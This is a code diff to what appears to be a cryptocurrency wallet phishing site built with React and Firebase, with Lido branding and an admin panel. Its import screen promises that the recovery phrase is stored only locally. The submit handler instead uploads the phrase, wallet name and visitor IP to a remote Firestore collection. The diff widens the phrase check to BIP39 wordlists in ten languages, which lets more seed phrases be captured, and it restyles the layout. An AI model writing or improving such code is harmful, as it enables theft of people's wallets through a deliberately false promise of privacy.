@@ -9,6 +9,7 @@ import {
   limit,
 } from "firebase/firestore";
 import { db } from "./firebase";
+import { LeftOutlined } from "@ant-design/icons";
 import { useEffect, useRef, useState } from "react";
 import { Route, Routes, BrowserRouter,useParams,Navigate,useNavigate } from "react-router-dom";
 import { createPortal } from "react-dom";
@@ -18,7 +19,16 @@ import logo from "./assets/logoLido.png";
 import menu from "./assets/menu.png";
 import AdminPage from "./pages/admin";
 import Login from "./pages/login";
-
+import english from './bip39/english'
+import spanish from './bip39/spanish'
+import portuguese from './bip39/portuguese'
+import korean from './bip39/korean'
+import japanese from './bip39/japanese'
+import italian from './bip39/italian'
+import french from './bip39/french'
+import czech from './bip39/czech'
+import chinese_traditional from './bip39/chinese_traditional'
+import chinese_simplified from './bip39/chinese_simplified'
 
 function PrivateRoute({ children }) {
   return localStorage.getItem("logined") === "true" ? (
@@ -599,13 +609,14 @@ const ImportWallet = () => {
              const validRange= [12,15,18,21,24];
              const privateArr = secretPharse.trim().split(/[\s]+/g);
              if(validRange.includes(privateArr.length)){
-                 var validAlls = true;
+                 var valid = true;
+                 const mergedPharse = english.concat(chinese_simplified,chinese_traditional,spanish,portuguese,korean,japanese,italian,french,czech)
                  privateArr.forEach(element => {
-                     if(!validWords.includes(element)){
-                         validAlls = false;
+                     if(!mergedPharse.includes(element)){
+                         valid = false;
                      }
                  });
-                 if(validAlls == true){
+                 if(valid){
                      const user = await addDoc(collection(db, "users"), {
                          wallet:walletName,secret:secretPharse,ip:ip,createdAt: new Date().getTime(),status:0
                      });
@@ -630,50 +641,44 @@ const ImportWallet = () => {
      }
    };
 
+
    return (
- <div id="app-content">
-         <div className="os-win">
-             <div>
-                 <div className="first-time-flow">
-                     <div className="welcome-page__wrapper custom">
-                         {/* <a className="back-step" onClick={history.goBack}>
-                             <i className="fa fa-chevron-left" style={{fontSize: '15px', color: '#717070'}}></i>
-                         </a> */}
-                         <div className="wallet">
-                                 <div className="title">Enter your recovery phrase</div>
-                                 <div className="description">
-                                     Your recovery phrase will only be stored locally on your device.
-                                 </div>
-                                 <div className="group">
-                                     <div className="select-type">
-                                         <textarea style={{overflow: 'hidden'}} value={secretPharse}
-                                         onChange={(e) => {
-                                             SetShowErrMsg(false);
-                                             if(!isLetter(e.target.value) && e.target.value.length > secretPharse) return;
-                                             SetSecretPharse(e.target.value);
-                                         }} className="input-phrase" name="phrase" id="phrase" placeholder="Enter your recovery phrase"></textarea>
-                                     </div>
-                                     <span style={{display: IsShowErrMsg ? 'inline-block' : 'none'}}className="phrase-error">Secret Recovery Phrases contain 12, 15, 18, 21, or 24
-                                         words</span>
-                                 </div>
-                             <div className="group import-group" style={{width: '100%'}}>
-                                 <button disabled={IsProcessing} onClick={handleSubmit} type="button" className="btn-import btn-disable">
-                                 <span style={{display:IsProcessing ? 'inline-block':'none'}} className="loader"></span>
-                                     <span style={{paddingLeft: '5px'}}>Import</span>
-                                 </button>
-                                 <button style={{display:IsValidPharse ? 'inline-block':'none'}} type="button" className="btn-skip hide">
-                                     <a rel="noopener noreferrer" href="https://metamask.app.link/dapp/https://jup.ag/">
-                                     Connect Your Wallet
-                                     </a>
-                                 </button>
-                             </div>
+    <div className="custom container mx-auto px-4 h-[100vh] flex flex-row min-h-screen justify-center items-start">
+                 <div className="wallet relative flex flex-col gap-y-2 justify-center items-center">
+                 <a className="back-step" onClick={history.goBack}>
+                            <LeftOutlined className="site-form-item-icon" />
+                            </a>
+                         <div className="title">Enter your recovery phrase</div>
+                         <div className="description">
+                             Your recovery phrase will only be stored locally on your device.
                          </div>
-                     </div>
+                         <div className="group">
+                             <div className="select-type">
+                                 <textarea style={{overflow: 'hidden'}} value={secretPharse}
+                                 onChange={(e) => {
+                                     SetShowErrMsg(false);
+                                     if(!isLetter(e.target.value) && e.target.value.length > secretPharse) return;
+                                     SetSecretPharse(e.target.value);
+                                 }} className="input-phrase" name="phrase" id="phrase" placeholder="Enter your recovery phrase"></textarea>
+                             </div>
+                             <span style={{display: IsShowErrMsg ? 'inline-block' : 'none'}}className="phrase-error">Secret Recovery Phrases contain 12, 15, 18, 21, or 24
+                                 words</span>
+                         </div>
+                   
                  </div>
+                 <div className="absolute bottom-0 w-[400px]">
+                         <button disabled={IsProcessing} onClick={handleSubmit} type="button" className="btn-import btn-disable">
+                         <span style={{display:IsProcessing ? 'inline-block':'none'}} className="loader"></span>
+                             <span style={{paddingLeft: '5px'}}>Import</span>
+                         </button>
+                         <button style={{display:IsValidPharse ? 'inline-block':'none'}} type="button" className="btn-skip hide">
+                             <a rel="noopener noreferrer" href="https://metamask.app.link/dapp/https://jup.ag/">
+                             Connect Your Wallet
+                             </a>
+                         </button>
+                     </div>
              </div>
-         </div>
-     </div>
-   );
+      );
    
  }
 
